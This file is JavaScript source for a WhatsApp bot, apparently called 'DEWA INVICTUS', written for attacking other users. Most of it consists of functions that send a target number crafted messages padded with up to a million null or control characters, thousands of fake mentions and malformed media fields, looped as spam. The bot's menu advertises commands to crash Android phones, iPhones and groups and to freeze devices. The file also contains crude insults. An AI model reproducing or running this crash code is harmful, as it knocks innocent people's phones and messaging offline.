    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}
    
async function invisibleSpam(sock, target) {
  for (let i = 0; i < 1; i++) {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "\u0003",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );
  }
  await new Promise(resolve => setTimeout(resolve, 1000));
}
    
async function oneMsg(target) {
  await sock.relayMessage(target, {
    requestPaymentMessage: {
      currencyCodeIso4217: 'USD',
      requestFrom: idol,
      expiryTimestamp: null,
      contextInfo: {
        remoteJid: " X ",
        isForwarded: true,
        forwardingScore: 979,
        externalAdReply: {
          title: "@ Sólo un trabas",
          body: "@ Sólo un trabas",
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewTtpe: "VIDEO",
          sourceUrl: "https://t.me/xrelly",
          mediaUrl: "https://t.me/xrelly",
          showAdAttribution: true,
        }
      }
    }
  }, {
    participant: { jid: target },
    quoted: null,
    useraJid: null,
    messageId: null
  });
}

async function Gyxlores(target) {
    try {
        await sock.relayMessage(
            target,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            messageSecret: crypto.randomBytes(32)
                        },
                        eventMessage: {
                            isCanceled: false,
                            name: "X",
                            description: "Dick Your Big",
                            location: {
                                degreesLatitude: "a",
                                degreesLongitude: "a",
                                name: "X"
                            },
                            joinLink: "https://call.whatsapp.com/voice/wrZ273EsqE7NGlJ8UT0rtZ",
                            startTime: "1714957200",
                            thumbnailDirectPath: "aHR0cHM6Ly9maWxlcy5jYXRib3gubW9lLzZodTIxai5qcGc=",
                            thumbnailSha256: Buffer.from('1234567890abcdef', 'hex'),
                            thumbnailEncSha256: Buffer.from('abcdef1234567890', 'hex'),
                            mediaKey: Buffer.from('abcdef1234567890abcdef1234567890', 'hex'),
                            mediaKeyTimestamp: Date.now(),
                            contextInfo: {
                                mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@.s.whatsapp.net"),
                                remoteJid: "status@broadcast",
                                participant: "0@s.whatsapp.net",
                                fromMe: false,
                                isForwarded: true,
                                forwardingScore: 9999,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: "1@newsletter",
                                    serverMessageId: 1,
                                    newsletterName: "X"
                                },
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "X",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: 'address_message',
                                            paramsJson: "\x10".repeat(1000000),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            },
            {
                ephemeralExpiration: 5,
                timeStamp: Date.now()
            }
        );
        let etc = await generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "X",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000),
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                userJid: target,
                quoted: null
            }
        );

        await sock.relayMessage(target, etc.message, {
            participant: { jid: target }
        });
    } catch (err) {
        console.error("Error:", err);
    }
}

async function vom2gsglx(sock, target) {
  for (let z = 0; z < 50; z++) {
    let msg = generateWAMessageFromContent(target, {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            },
            body: {
              text: "᬴".repeat(45000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"᬴".repeat(90000)}\",\"flow_message_version\": \"3\"}`,
              version: 3
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    )
  };
  await sleep(5000)
}

async function fuckgroupXnxx(sock, target) {
    const messageContent = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "×‌×ᴏᴛᴀx ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒",
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000),
              text: "ꦽ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "Permisi Numpang Lewat",
              buttons: [
                { name: "single_select", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_method", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "call_permission_request", buttonParamsJson:"\u0003".repeat(5000), voice_call: "call_galaxy" },
                { name: "form_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_learn_more", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_transaction_details", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "wa_payment_fbpin_reset", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "catalog_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_info", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_order", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "send_location", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payments_care_csat", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "view_product", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_settings", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "address_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "automated_greeting_message_view_catalog", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "open_webview", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "message_with_link_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "payment_status", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_costum", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "extensions_message_v2", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "landline_call", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "mpm", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_copy", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_url", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "review_and_pay", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "galaxy_message", buttonParamsJson:"\u0003".repeat(5000)},
                { name: "cta_call", buttonParamsJson:  "\u0003".repeat(5000) }
              ]
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, messageContent.message, {
      messageId: messageContent.key.id,
      participant : { jid: target},
    });

    console.log(chalk.red(`Dah Sukses Bosku`));
  }
  
async function RFPSerxous(sock, target) {
  let yutaxdelay2 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Hama",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(145000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        },
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
   };
   
   let yutaxdelay = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "ꦾ".repeat(180000),
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "2892ꦾ8181@s.whatsapp.net"
            },
            stanzaId: "Hika-Id" + Math.floor(Math.random() * 99999),
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780349272@newsletter",
              serverMessageId: 1,
              newsletterName: "ោ៝".repeat(30000)
            },
            mentions: Array.from({ length: 2000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Maklu Tepos"
                    },
                    nativeFlowResponseMessage: {
                      name: "address_message",
                      paramsJson: "ꦾ".repeat(30000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };
  
  let yutaxdelay1 = {
    viewOnceMessage: {
      message: {
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
          fileLength: "999999999999",
          pageCount: 1316134911,
          mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
          fileName: "Tes!!",
          fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
          directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc",
          mediaKeyTimestamp: "1743848703",
          caption: "ꦾ".repeat(180000),
          contextInfo: {
            remoteJid: target,
            fromMe: true,
            participant: target,
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1${i}@s.whatsapp.net`),
            groupMentions: [
              {
                groupJid: "628xxxxxx2345@g.us",
                groupSubject: "ꦾ".repeat(30000)
              }
            ],
            forwardingScore: 999
          }
        }
      }
    }
  };
  
  const delay1 = generateWAMessageFromContent(target, yutaxdelay1.message, {});
  
   const delay = generateWAMessageFromContent(target, yutaxdelay.message, {});
   
   const delay2 = generateWAMessageFromContent(target, yutaxdelay2.message, {});
  
  await sock.relayMessage("status@broadcast", delay2.message, {
      messageId: delay2.key.id,
      statusJidList: [target]
    });
    
  await sock.relayMessage("status@broadcast", delay.message, {
      messageId: delay.key.id,
      statusJidList: [target]
    });
    
  await sock.relayMessage("status@broadcast", delay1.message, {
      messageId: delay1.key.id,
      statusJidList: [target]
    });
    console.log(`Succes Sending Dewa To ${target}`);
}

async function xinvis3(sock, target) {
    const msg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                        fileLength: "999999",
                        seconds: 999999,
                        mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                        height: 999999,
                        width: 999999,
                        fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                        directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743742853",
                        contextInfo: {
                            isSampled: true,
                            mentionedJid: [
                                "13135550002@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () =>
                                    `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                                )
                            ]
                        },
                        streamingSidecar:
                            "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                        thumbnailDirectPath:
                            "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        annotations: [
                            {
                                embeddedContent: {
                                    embeddedMusic: {
                                        musicContentMediaId: "kontol",
                                        songId: "peler",
                                        author: "\u0003".repeat(100),
                                        title: "null",
                                        artworkDirectPath:
                                            "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                        artistAttribution:
                                            "https://www.instagram.com/_u/tamainfinity_",
                                        countryBlocklist: true,
                                        isExplicit: true,
                                        artworkMediaKey:
                                            "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                    }
                                },
                                embeddedAction: null
                            }
                        ]
                    }
                }
            }
        },
        {}
    );

    await sock.relayMessage(
        "status@broadcast",
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }
                    ]
                }
            ]
        }
    );

    await sock.relayMessage(
        "status@broadcast",
        {
            groupStatusMessageV2: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
            ]
        }
    );
}

async function trashInv(sock, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              header: {
                title: "",
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongtitude: 0
                },
                hasMediaAttachMent: true
              },
              contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                remoteJid: "status@broadcast",
                mentionedJid: [
                  "0@s.whatsapp.net",
                  ...Array.from(
                    { length: 1999 },
                    () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                  )
                ],
                externalAdReply: {
                  quotedAd: {
                    advertiserName: "\x10".repeat(600),
                    mediaType: "IMAGE",
                    jpegThumbnail: null,
                    caption: ""
                  },
                  placeholderKey: {
                    remoteJid: "0s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                  }
                }
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: "ោ៝".repeat(60000)
                    })
                  }
                ],
                messageParamsJson: "{}".repeat(10000)
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: target }
      }
    );
  } catch (err) {
    console.error(err);
  }
}

async function TrueNull(sock, target) {
  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(
    target,
    module.message,
    { userJid: target }
  );

  await sock.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target } }
            ]
          }
        ]
      }
    ]
  });
  const viewOnceMsg = generateWAMessageFromContent(
  "status@broadcast",
  {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "X",
            format: "BOLD"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  },
  {}
);
await sock.relayMessage(
  "status@broadcast",
  viewOnceMsg.message,
  {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  }
);
console.log(chalk.red(`Succes Send ${target}`));
}
    
//FUNCTION LOGIKA MENU JANGAN HAPUS //===
async function propoversGroups(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
          expiration: 1,
          ephemeralSettingTimestamp: 1,
          entryPointConversionSource: "WhatsApp.com",
          entryPointConversionApp: "WhatsApp",
          entryPointConversionDelaySeconds: 1,
          disappearingMode: {
            initiatorDeviceJid: target,
            initiator: "INITIATED_BY_OTHER",
            trigger: "UNKNOWN_GROUPS"
          },
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            },
            externalAdReply: {
              showAdAttribution: true,
              renderLargerThumbnail: true
            }
          },
            body: {
              text: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                     status: true,
                     criador: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6281572074859",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩"
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ 
                  status: true,
                     criador: "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩",
                     versao: "@latest",
                     atualizado: "2025-04-15",
                     suporte: "https://wa.me/6281572074859",
                     comandosDisponiveis: [`${command}`],
                     prefixo: `${prefix}`,
                     linguagem: "id"
                  }) + "𝘇𝗮𝗹𝗹 𝐊𝐢𝐥𝐥 𝐆𝐫𝐨𝐮𝐩"
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

const QclrsXjustin = {
			key: {
				remoteJid: '🩸Justin',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Justin Crash",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "wraper-osXjustin",
						"paramsJson": `{\"splashscreen_2_OptIn_0\":true,\"splashscreen_2_OptIn_1\":true,\"splashscreen_1_Dropdown_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥\",\"splashscreen_1_DatePicker_1\":\"1028995200000\",\"splashscreen_1_TextInput_2\":\"JustinAndiar\",\"screen_1_TextInput_3\":\"94643116\",\"splashscreen_0_TextInput_0\":\"𝐉𝐮𝐬𝐭𝐢𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥${"\u0003".repeat(1045000)}\",\"splashscreen_0_TextInput_1\":\"INFINITE\",\"splashscreen_0_Dropdown_2\":\"001-Grimgar\",\"splashscreen_0_wraper-osXjustin_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 17
					}
				}
			}
		}
		
        const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": foto,
					"thumbnailUrl": "https://d.top4top.io/p_3645qplmv0.jpg",
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "pong 𝐈𝐦 𝐁𝐚𝐜𝐤",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}
///// 𝐄𝐍𝐃 𝐅𝐔𝐍𝐂 𝐁𝐔𝐆 /////===
		const reply = async (teks) => {
return sock.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦", 
body: `pong available`, 
thumbnailUrl: "https://d.top4top.io/p_3645qplmv0.jpg", 
sourceUrl: null, 
}}}, {quoted: PayX })
}
		   
const qchannel = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {
newsletterAdminInviteMessage: {newsletterJid: `120363403224294305@newsletter`, newsletterName: `𝘽𝙀𝙍𝘽𝘼𝙂𝘼𝙄 𝘽𝘼𝙎𝙀 𝘼𝙉𝘿 𝙁𝙐𝙉𝘾𝙏𝙄𝙊𝙉 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋🚀`, jpegThumbnail: "", caption: `𝐏𝐨𝐧𝐠 𝐈𝐬 𝐇𝐞𝐫𝐞`, inviteExpiration: 0 }}}
		
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝐏𝐨𝐧𝐠 𝐈𝐬 𝐇𝐞𝐫𝐞`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6287732756731:+62 821-2415-1716\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
        switch (command) {
case 'menu': {
await sock.sendMessage(m.chat, { react: { text: "☠️",key: m.key,}}); 
let menu = `*Yōkoso @${m.sender.split("@")[0]}, otetsudai sasete itadakimasu, 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 Atarashii menyū o goyōi shimashita.*

*\`[ 𝐃𝐄𝐖𝐀 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐅𝐑𝐄𝐄 ]\`*
⎋ スクリプト名 : 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
⎋ リプ : 𝟐.𝟎 𝐅𝐑𝐄𝐄
⎋ 開発者 : 𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥
⎋ バージョン : *Free*
⎋ リプト : *${runtime(process.uptime())}*

> Click the button to select the menu
`
    let buttons = [
        { buttonId: ".info", buttonText: { displayText: "𝐈𝐧𝐟𝐨 𝐒𝐜𝐫𝐢𝐩𝐭" } }
        
    ];

    let buttonMessage = {
        image: { url: `https://d.top4top.io/p_3645qplmv0.jpg` },      
        caption: menu, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦`,
                body: `pong available`,
                thumbnailUrl: `https://d.top4top.io/p_3645qplmv0.jpg`,
                sourceUrl: ` `,
                mediaType: 1,
                renderLargerThumbnail: false, 
            }
        },
        footer: "𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦",  
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };

        
        const flowActions = {
        buttonId: 'action',
        buttonText: { displayText: 'This Button List' },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "㲾 𝐁𝐮𝐭𝐭𝐨𝐧 𝐋𝐢𝐬𝐭",
                sections: [
                    {
                        title: "",
                        highlight_label: "𝐏𝐨𝐧𝐠 𝐈𝐬 𝐇𝐞𝐫𝐞",
                        rows: [
                            { title: "㲾 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", description: "ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ", id: `.tqto` },
                            { title: "㲾 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", description: "ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ʙᴜɢ ᴍᴇɴᴜ", id: `.bugmenu` },
                            { title: "㲾 𝐅𝐮𝐧 𝐌𝐞𝐧𝐮", description: "ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғᴜɴ ᴍᴇɴᴜ", id: `.funmenu` },
                            { title: "㲾 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", description: "ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғᴜɴ ᴍᴇɴᴜ", id: `.ownermenu` },
                            { title: "㲾 𝐈𝐬𝐥𝐚𝐦𝐢 𝐌𝐞𝐧𝐮", description: "إظهار القائمة الإسلامية", id: `.islami` }
                            
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    };

    buttonMessage.buttons.push(flowActions);

    await sock.sendMessage(m.chat, buttonMessage, { quoted: PayX });  
   await sock.sendMessage(m.chat, { audio: fs.readFileSync('./audio/dewa.mp3'), mimetype: 'audio/mpeg', ptt: true }, { quoted: qchannel });     
}
break
case 'bugmenu': {
await sock.sendMessage(m.chat, { react: { text: "💥",key: m.key,}}); 
let menu = `
*Yōkoso @${m.sender.split("@")[0]}, otetsudai sasete itadakimasu, 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 Atarashii menyū o goyōi shimashita.*

*\`[ 𝐃𝐄𝐖𝐀 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐅𝐑𝐄𝐄 ]\`*
⎋ スクリプト名 : 𝗗𝗘𝗪𝗔 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦
⎋ リプ : 𝟐.𝟎 𝐅𝐑𝐄𝐄
⎋ 開発者 : 𝙂𝙪𝙥𝙤𝙣𝙜𝙎𝙝𝙤𝙥
⎋ バージョン : *Free*
⎋ リプト : *${runtime(process.uptime())}*

\`㲾\` 𝐁𝐮𝐠 𝐁𝐥𝐚𝐧𝐤 \`㲾\`
─ ◇ .dewa-blank 62xxx
─ᴄʀᴀsʜ ᴀɴᴅʀᴏ 
─ᴄʀᴀsʜ ɴᴏ ᴡᴏʀx ᴀʟʟ ᴅᴇᴠɪᴄᴇ
─ᴄʀᴀsʜ ᴜɪ ᴄɪʟɪᴋ

\`㲾\` 𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩 \`㲾\`
─ ◇ .crash-gb 62xxx
─ᴄʀᴀsʜ ɢʀᴏᴜᴘ
─ᴄʀᴀsʜ ᴜɪ ᴄɪʟɪᴋ

\`㲾\` 𝐁𝐮𝐠 𝐃𝐞𝐥𝐚𝐲 \`㲾\`
─ ◇ .delay-spam 62xxx
─ᴅᴇʟᴀʏ ɪɴᴠɪsɪʙʟᴇ 
─ᴅᴇʟᴀʏ ʙᴇʙᴀs sᴘᴀᴍ 
─90% ᴀɴᴛɪ ʟᴏɢ ᴏᴜᴛ

\`㲾\` 𝐁𝐮𝐠 𝐈𝐏𝐡𝐨𝐧𝐞 \`㲾\`
─ ◇ . dewa-ipong 628xxx
─ᴄʀᴀsʜ ɪᴘʜᴏɴᴇ
